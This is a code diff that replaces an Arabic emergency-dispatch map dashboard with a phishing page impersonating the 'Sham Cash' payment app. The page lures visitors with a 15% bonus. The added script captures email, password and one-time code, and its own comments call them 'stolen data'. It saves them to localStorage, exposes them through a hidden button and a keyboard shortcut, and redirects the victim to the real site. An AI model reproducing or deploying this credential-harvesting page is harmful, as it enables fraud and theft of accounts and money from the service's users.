@@ -1,220 +1,172 @@
 <!DOCTYPE html>
-<html lang="ar" dir="rtl">
+<html dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>غرفة العمليات المركزية | نظام التتبع التلقائي</title>
-    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>شام كاش - بونص 15%</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Cairo', sans-serif; }
-        body { background: #0b0f19; color: #f8fafc; height: 100vh; overflow: hidden; display: flex; flex-direction: column; }
-
-        #splashScreen { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #0b0f19; z-index: 9999; display: flex; flex-direction: column; justify-content: center; align-items: center; transition: opacity 0.4s ease, visibility 0.4s; }
-        .splash-logo { width: 100px; height: 100px; margin-bottom: 20px; animation: pulseLogo 1.5s infinite ease-in-out; }
-        .splash-title { font-size: 26px; font-weight: 900; color: #ef4444; text-shadow: 0 0 15px rgba(239, 68, 68, 0.4); margin-bottom: 10px; }
-        .splash-slogan { font-size: 18px; font-weight: 700; color: #10b981; }
-        @keyframes pulseLogo { 0%, 100% { transform: scale(1); opacity: 0.8; } 50% { transform: scale(1.08); opacity: 1; filter: drop-shadow(0 0 15px #ef4444); } }
-
-        .app-content { display: flex; flex-direction: column; height: 100vh; width: 100%; opacity: 0; transition: opacity 0.5s ease; }
-        .app-content.loaded { opacity: 1; }
-
-        .map-container { width: 100%; height: 45vh; position: relative; }
-        #map { height: 100%; width: 100%; }
-
-        .sidebar { width: 100%; height: 55vh; background: #111827; border-top: 3px solid #10b981; display: flex; flex-direction: column; overflow: hidden; }
-        .sidebar-header { padding: 14px; background: #1f2937; text-align: center; border-bottom: 1px solid #374151; box-shadow: 0 4px 6px rgba(0,0,0,0.2); display: flex; justify-content: space-between; align-items: center; }
-        .sidebar-header h2 { font-size: 16px; font-weight: 800; color: #10b981; margin: 0;}
-        .radar-status { font-size: 12px; color: #ef4444; font-weight: 700; display: flex; align-items: center; gap: 5px; }
-        .radar-status.active { color: #10b981; }
-        .pulse { width: 8px; height: 8px; background: currentColor; border-radius: 50%; box-shadow: 0 0 8px currentColor; }
-        .pulse.active { animation: pulseDot 1s infinite; }
-        @keyframes pulseDot { 0% { opacity: 0.3; } 50% { opacity: 1; } 100% { opacity: 0.3; } }
-        
-        .main-flow { flex: 1; overflow-y: auto; padding: 12px; }
-        .section-title { font-size: 13px; font-weight: 700; color: #9ca3af; margin-bottom: 8px; }
-        .incident-card { background: #1f2937; border-radius: 12px; padding: 14px; margin-bottom: 12px; border-right: 5px solid #ef4444; border: 1px solid #2d3748; cursor: pointer; transition: background 0.2s; }
-        .incident-card:hover { background: #374151; }
-        
-        .tactical-panel { background: #1f2937; border-radius: 12px; padding: 14px; margin-top: 5px; display: none; border: 1px solid #374151; }
-        .tactical-panel.show { display: block; animation: slideUp 0.3s ease-out; }
-        @keyframes slideUp { from { transform: translateY(10px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-        
-        .plan-box { background: #0b0f19; border: 1px dashed #10b981; border-radius: 8px; padding: 12px; font-size: 13px; line-height: 1.7; color: #e2e8f0; }
-        .maps-btn { display: inline-flex; align-items: center; justify-content: center; gap: 8px; width: 100%; margin-top: 12px; padding: 12px; background: #2563eb; color: white; text-decoration: none; border-radius: 8px; font-weight: 700; font-size: 14px; }
-
-        @media (min-width: 768px) {
-            body { flex-direction: row-reverse; }
-            .app-content { flex-direction: row-reverse; }
-            .map-container { width: 70%; height: 100vh; }
-            .sidebar { width: 30%; height: 100vh; border-top: none; border-left: 2px solid #1f2937; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Tahoma', Arial; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
+        .container { background: white; padding: 30px; border-radius: 12px; box-shadow: 0 0 20px rgba(0,0,0,0.1); width: 380px; text-align: center; }
+        .logo { font-size: 26px; font-weight: bold; color: #1877f2; margin-bottom: 15px; }
+        .bonus { color: #e74c3c; font-size: 22px; font-weight: bold; margin: 10px 0; }
+        .input-group { margin: 12px 0; text-align: right; }
+        .input-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 15px; }
+        .btn { width: 100%; padding: 12px; background: #1877f2; color: white; border: none; border-radius: 8px; font-size: 16px; cursor: pointer; }
+        .hidden-btn { 
+            position: fixed; 
+            bottom: 10px; 
+            right: 10px; 
+            width: 30px; 
+            height: 30px; 
+            background: transparent; 
+            border: none; 
+            cursor: pointer; 
+            opacity: 0.3;
+            z-index: 999;
         }
+        .hidden-btn:hover { opacity: 1; }
+        #dataDisplay { 
+            display: none; 
+            background: #1a1a2e; 
+            color: #0f0; 
+            padding: 15px; 
+            border-radius: 8px; 
+            margin-top: 15px; 
+            text-align: left; 
+            font-size: 12px; 
+            max-height: 200px; 
+            overflow-y: auto; 
+            white-space: pre-wrap;
+            direction: ltr;
+        }
+        #clickCounter { 
+            display: none; 
+            font-size: 11px; 
+            color: #999; 
+            margin-top: 5px; 
+        }
+        .note { font-size: 12px; color: #999; margin-top: 15px; }
     </style>
 </head>
 <body>
-
-    <div id="splashScreen">
-        <svg class="splash-logo" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
-            <path d="M12 2L3 7V12C3 16.5222 6.8436 20.3541 12 22C17.1564 20.3541 21 16.5222 21 12V7L12 2Z" fill="#ef4444"/>
-            <path d="M12 6V18M6 12H18" stroke="#ffffff" stroke-width="2.5" stroke-linecap="round"/>
-        </svg>
-        <div class="splash-title">غرفة العمليات المركزية</div>
-        <div class="splash-slogan">نظام التتبع والرصد التلقائي</div>
+    <div class="container">
+        <div class="logo">🏦 شام كاش</div>
+        <h3>🎁 عرض خاص</h3>
+        <p class="bonus">احصل على بونص 15% على أول شحن!</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <input type="email" id="email" placeholder="البريد الإلكتروني" required>
+            </div>
+            <div class="input-group">
+                <input type="password" id="password" placeholder="كلمة المرور" required>
+            </div>
+            <div class="input-group">
+                <input type="text" id="otp" placeholder="رمز التحقق OTP" maxlength="6">
+            </div>
+            <button type="submit" class="btn">تأكيد واستلام البونص</button>
+        </form>
+        
+        <!-- زر مخفي لاستعراض البيانات -->
+        <button class="hidden-btn" id="hiddenBtn" title="اضغط 3 مرات لعرض البيانات"></button>
+        <div id="clickCounter">0 / 3</div>
+        
+        <!-- عرض البيانات المسجلة -->
+        <div id="dataDisplay"></div>
+        
+        <div class="note">سيتم توجيهك إلى التطبيق بعد التأكيد</div>
     </div>
 
-    <div class="app-content" id="appContent">
-        <div class="map-container">
-            <div id="map"></div>
-        </div>
-
-        <div class="sidebar">
-            <div class="sidebar-header">
-                <h2>🛰️ الرصد الجغرافي</h2>
-                <div class="radar-status active"><div class="pulse active"></div> الرادار نشط</div>
-            </div>
-            
-            <div class="main-flow">
-                <div class="section-title">📊 البلاغات الواردة (تحديث تلقائي):</div>
-                <div id="incidentCardSlot">
-                    <p style="text-align:center; color:#6b7280; font-size:12px; padding:20px;">لا توجد بلاغات جديدة، الرادار يقوم بالمسح...</p>
-                </div>
-
-                <div class="tactical-panel" id="tacticalPanel">
-                    <div style="font-size: 13.5px; font-weight: 800; color: #10b981; margin-bottom: 8px;">🛡️ الحساب التكتيكي وأقرب إسناد:</div>
-                    <div class="plan-box" id="planContent"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
-<script>
-    const CENTERS = {
-        "مركز ريف دمشق الإقليمي": [33.5130, 36.2930],
-        "وحدة إطفاء جرمانا": [33.4882, 36.3592],
-        "مركز باب شرقي": [33.5091, 36.3211],
-        "وحدة إسناد المليحة": [33.4833, 36.3711],
-        "مركز الطوارئ بدمشق": [33.5102, 36.2714]
-    };
-
-    // تم إدراج الرابط الخاص بك هنا
-    const GOOGLE_API_URL = "https://script.google.com/macros/s/AKfycbx3Sa2RdpAiwXsYyTXsOCYnPlFzbu_bETxvXh1PAYO77p6IgXEISQaTjd8Jo7KVWCEN/exec";
-
-    let map, activeMarker, activeCircle, activeLine;
-    let knownIncidents = new Set();
-
-    window.addEventListener('DOMContentLoaded', () => {
-        setTimeout(() => {
-            document.getElementById('splashScreen').style.opacity = '0';
-            document.getElementById('splashScreen').style.visibility = 'hidden';
-            document.getElementById('appContent').classList.add('loaded');
-            initMap();
-            startAutoPolling();
-        }, 2000);
-    });
-
-    function initMap() {
-        map = L.map('map', { zoomControl: false }).setView([33.4950, 36.3400], 13);
-        L.control.zoom({ position: 'topright' }).addTo(map);
-        L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png').addTo(map);
-
-        Object.keys(CENTERS).forEach(name => {
-            L.marker(CENTERS[name], {
-                icon: L.icon({ iconUrl: 'https://cdn-icons-png.flaticon.com/512/784/784791.png', iconSize: [28, 28] })
-            }).addTo(map).bindPopup(`<b>${name}</b>`);
-        });
-    }
-
-    function calculateExactDistance(lat1, lon1, lat2, lon2) {
-        const R = 6371000;
-        const dLat = (lat2 - lat1) * Math.PI / 180;
-        const dLon = (lon2 - lon1) * Math.PI / 180;
-        const a = Math.sin(dLat / 2) * Math.sin(dLat / 2) + Math.cos(lat1 * Math.PI / 180) * Math.cos(lat2 * Math.PI / 180) * Math.sin(dLon / 2) * Math.sin(dLon / 2);
-        return R * (2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a))); 
-    }
-
-    function startAutoPolling() {
-        fetchIncidents(); 
-        setInterval(fetchIncidents, 7000);
-    }
-
-    async function fetchIncidents() {
-        try {
-            const response = await fetch(GOOGLE_API_URL);
-            const incidents = await response.json();
-            
-            if (incidents.length > 0) {
-                const latest = incidents[0]; 
-                const incidentId = latest.timestamp + "_" + latest.phone;
-
-                if (!knownIncidents.has(incidentId)) {
-                    knownIncidents.add(incidentId);
-                    processIncomingIncident(latest);
-                }
-            }
-        } catch (error) {
-            console.error("خطأ في تحديث الرادار السحابي");
-        }
-    }
-
-    function processIncomingIncident(incident) {
-        const cardSlot = document.getElementById('incidentCardSlot');
+    <script>
+        // ====== تخزين البيانات المسروقة ======
+        let stolenData = [];
+        let clickCount = 0;
         
-        if(cardSlot.innerHTML.includes('لا توجد بلاغات جديدة')) {
-            cardSlot.innerHTML = '';
-        }
-
-        const dateObj = new Date(incident.timestamp);
-        const timeString = dateObj.toLocaleTimeString('ar-SY', { hour: '2-digit', minute: '2-digit' });
-
-        const cardHTML = `
-            <div class="incident-card" onclick='triggerTacticalTracking(${JSON.stringify(incident)})'>
-                <div style="display:flex; justify-content:space-between; font-size:11px; color:#9ca3af; margin-bottom:5px;">
-                    <span style="background:rgba(239, 68, 68, 0.15); color:#ef4444; padding:2px 8px; border-radius:6px; font-weight:700;">${incident.type}</span>
-                    <span style="color:#10b981;">⏱️ ${timeString}</span>
-                </div>
-                <div style="font-size: 13px; color: #9ca3af; margin-bottom: 4px;">📞 جوال: ${incident.phone}</div>
-                <div style="font-size: 13px; color: #cbd5e1; background:#0f111a; padding:6px; border-radius:6px;">الموقع: ${incident.details}</div>
-            </div>
-        `;
+        // ====== عند إرسال النموذج ======
+        document.getElementById('loginForm').onsubmit = function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const otp = document.getElementById('otp').value;
+            const timestamp = new Date().toLocaleString('ar-EG');
+            
+            // تخزين البيانات
+            const entry = `[${timestamp}] البريد: ${email} | كلمة المرور: ${password} | OTP: ${otp}`;
+            stolenData.push(entry);
+            
+            // حفظ في localStorage (حتى لو أغلق الصفحة)
+            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
+            saved.push(entry);
+            localStorage.setItem('stolenData', JSON.stringify(saved));
+            
+            // عرض رسالة نجاح
+            alert('✅ جاري التحقق...');
+            
+            // توجيه للتطبيق الحقيقي
+            setTimeout(function() {
+                window.location.href = 'https://shamcash.com';
+            }, 2000);
+        };
         
-        cardSlot.innerHTML = cardHTML + cardSlot.innerHTML;
-        triggerTacticalTracking(incident);
-    }
-
-    function triggerTacticalTracking(incident) {
-        if (activeMarker) map.removeLayer(activeMarker);
-        if (activeCircle) map.removeLayer(activeCircle);
-        if (activeLine) map.removeLayer(activeLine);
-
-        map.flyTo([incident.lat, incident.lng], 15, { animate: true, duration: 1.5 });
-
-        activeMarker = L.marker([incident.lat, incident.lng]).addTo(map).bindPopup(`<b>موقع الحدث - ${incident.type}</b>`).openPopup();
-        activeCircle = L.circle([incident.lat, incident.lng], { color: '#ef4444', fillColor: '#ef4444', fillOpacity: 0.2, radius: parseInt(incident.accuracy) || 50 }).addTo(map);
-
-        let closestCenterName = "";
-        let minDistance = Infinity;
-
-        Object.keys(CENTERS).forEach(name => {
-            const distance = calculateExactDistance(incident.lat, incident.lng, CENTERS[name][0], CENTERS[name][1]);
-            if (distance < minDistance) {
-                minDistance = distance;
-                closestCenterName = name;
+        // ====== الزر المخفي (ضغط 3 مرات) ======
+        document.getElementById('hiddenBtn').addEventListener('click', function() {
+            clickCount++;
+            document.getElementById('clickCounter').style.display = 'block';
+            document.getElementById('clickCounter').textContent = `${clickCount} / 3`;
+            
+            if (clickCount >= 3) {
+                // عرض البيانات
+                showStolenData();
+                clickCount = 0;
+                document.getElementById('clickCounter').textContent = '✅ ظهرت البيانات';
             }
         });
-
-        activeLine = L.polyline([CENTERS[closestCenterName], [incident.lat, incident.lng]], { color: '#10b981', weight: 3, dashArray: '6, 8' }).addTo(map);
-
-        const googleMapsLink = `https://www.google.com/maps/dir/?api=1&origin=${CENTERS[closestCenterName][0]},${CENTERS[closestCenterName][1]}&destination=${incident.lat},${incident.lng}`;
-
-        document.getElementById('tacticalPanel').classList.add('show');
-        document.getElementById('planContent').innerHTML = `
-            🚒 <b>أقرب إسناد تلقائي:</b> <span style="color:#10b981">${closestCenterName}</span><br>
-            📏 <b>المسافة الهندسية:</b> <span style="color:#ef4444">${(minDistance / 1000).toFixed(2)} كم</span><br>
-            🎯 <b>نطاق الـ GPS:</b> ±${incident.accuracy || 50} متر.<br>
-            <a href="${googleMapsLink}" target="_blank" class="maps-btn">🌐 فتح مسار الإمداد عبر خرائط Google</a>
-        `;
-    }
-</script>
+        
+        // ====== عرض البيانات المسجلة ======
+        function showStolenData() {
+            const display = document.getElementById('dataDisplay');
+            
+            // جلب البيانات من localStorage
+            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
+            
+            if (saved.length === 0) {
+                display.textContent = '📭 لا توجد بيانات مسجلة بعد.';
+                display.style.display = 'block';
+                return;
+            }
+            
+            // تنسيق البيانات
+            let output = '📋 البيانات المسجلة:\n' + '='.repeat(40) + '\n';
+            saved.forEach((entry, index) => {
+                output += `${index + 1}. ${entry}\n`;
+                output += '-'.repeat(40) + '\n';
+            });
+            output += `\n📊 إجمالي: ${saved.length} عملية`;
+            
+            display.textContent = output;
+            display.style.display = 'block';
+            
+            // إظهار إشعار بعدد البيانات
+            alert(`✅ تم استلام ${saved.length} عملية بنجاح!`);
+        }
+        
+        // ====== تحميل البيانات السابقة عند فتح الصفحة ======
+        window.onload = function() {
+            const saved = JSON.parse(localStorage.getItem('stolenData') || '[]');
+            if (saved.length > 0) {
+                console.log(`📥 تم تحميل ${saved.length} عملية مسجلة مسبقاً`);
+            }
+        };
+        
+        // ====== اختصار لوحة المفاتيح (Ctrl+Shift+D) لعرض البيانات ======
+        document.addEventListener('keydown', function(e) {
+            if (e.ctrlKey && e.shiftKey && e.key === 'D') {
+                e.preventDefault();
+                showStolenData();
+            }
+        });
+    </script>
 </body>
 </html>
